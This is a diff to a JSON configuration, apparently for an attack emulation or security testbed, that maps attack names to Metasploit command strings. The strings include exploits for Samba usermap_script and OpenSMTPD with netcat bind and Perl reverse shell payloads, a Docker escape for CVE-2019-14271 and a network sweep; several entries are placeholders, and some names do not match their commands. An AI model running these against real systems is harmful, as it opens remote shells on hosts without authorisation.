@@ -7,32 +7,124 @@
         "wait_time": "10",
         "config": ""
       },
+      "docker_escape": {
+        "instructions": "use exploit/multi/handler \nset target {}\n set LHOST{} \nset LPORT {LPORT}\n exploit",
+        "attack_type": "MetasploitAttack",
+        "wait_time": "50",
+        "config": ""
+      },
       "smb_server": {
         "instructions": "setg payload cmd/unix/bind_netcat\nuse exploit/multi/samba/usermap_script\nsetg RHOSTS {}\nsetg LPORT {LPORT}\nexploit -p cmd/unix/bind_netcat",
         "attack_type": "",
         "wait_time": "25",
         "config": ""
       },
-      "smtp_server": {
+      "addSSHkey": {
         "instructions": "back \n set payload cmd/unix/reverse_perl \n set ForceExploit true \n set DB_WORKSPACE . \n set RHOSTS {} \n set LISTENER {} \n set LPORT {LPORT} \n resource /data/attacker/custom_attacks/smtpd/attacco_opensmtpd_mod.rc",
         "attack_type": "ResourceAttack",
         "wait_time": "60",
         "config": "../stack/data/attacker/custom_attacks/smtpd/config_rc.json"
         
       },
-      "tomcat_server": {
+      "bruteForce": {
         "instructions": "back\nset RHOSTS {}\nset target 0\nset LPORT {LPORT}\nresource /data/attacker/custom_attacks/docker_escape/CVE-2019-14271.rc",
         "attack_type": "ResourceAttack",
         "wait_time": "30",
         "config": "../stack/data/attacker/custom_attacks/docker_escape/config_rc.json"
-      }
+      },
+      "compromise": {
+        "instructions": "echo no compromise attack",
+        "attack_type": "NotImplementedAttack",
+        "wait_time": "10",
+        "config": ""
+      },
+     "scanIP": {
+       "instructions": "echo no scanIP attack",
+       "attack_type": "NotImplementedAttack",
+       "wait_time": "10",
+       "config": ""
+     },
+     "scanVuln": {
+       "instructions": "echo no scanVuln attack",
+       "attack_type": "NotImplementedAttack",
+       "wait_time": "10",
+       "config": ""
+     },
+     "remoteSrvc": {
+      "instructions": "echo no remoteSrvc attack",
+      "attack_type": "NotImplementedAttack",
+      "wait_time": "10",
+      "config": ""
     },
+    "shell": {
+      "instructions": "echo no shell attack",
+      "attack_type": "NotImplementedAttack",
+      "wait_time": "10",
+      "config": ""
+    },
+    "remoteShell": {
+      "instructions": "echo no remoteShell attack",
+      "attack_type": "NotImplementedAttack",
+      "wait_time": "1",
+      "config": ""
+    },
+    "escapeHost": {
+      "instructions": "echo no escapeHost attack",
+      "attack_type": "NotImplementedAttack",
+      "wait_time": "1",
+      "config": ""
+    },
+    "modAuthProc": {
+      "instructions": "echo no modAuthProc attack",
+      "attack_type": "NotImplementedAttack",
+      "wait_time": "1",
+      "config": ""
+    },
+    "unsecCred": {
+      "instructions": "echo no unsecCred attack",
+      "attack_type": "NotImplementedAttack",
+      "wait_time": "1",
+      "config": ""
+    },
+    "credAcc": {
+      "instructions": "echo no credAcc attack",
+      "attack_type": "NotImplementedAttack",
+      "wait_time": "1",
+      "config": ""
+    },
+    "AITM": {
+      "instructions": "echo no AITM attack",
+      "attack_type": "NotImplementedAttack",
+      "wait_time": "1",
+      "config": ""
+    },
+    "spoofRepMsg": {
+      "instructions": "echo no spoofRepMsg attack",
+      "attack_type": "NotImplementedAttack",
+      "wait_time": "1",
+      "config": ""
+    },
+    "unauthCmdMsg": {
+      "instructions": "echo no unauthCmdMsg attack",
+      "attack_type": "NotImplementedAttack",
+      "wait_time": "1",
+      "config": ""
+    },
+    "DERfailure": {
+      "instructions": "echo no DERfailure attack",
+      "attack_type": "NotImplementedAttack",
+      "wait_time": "1",
+      "config": ""
+    }
+   },
+
         "infect":{
       "MMS_over_TLS":{
         "instructions": "echo no MMS attack",
         "wait_time": "15"
       }
     },
+
     "scans": {
       "arp_sweep": {
         "instructions": "use auxiliary/scanner/discovery/arp_sweep\nset RHOSTS {}\nset THREADS 256\nset TIMEOUT 1\nexploit",
@@ -60,4 +152,3 @@
   
   
 }
-
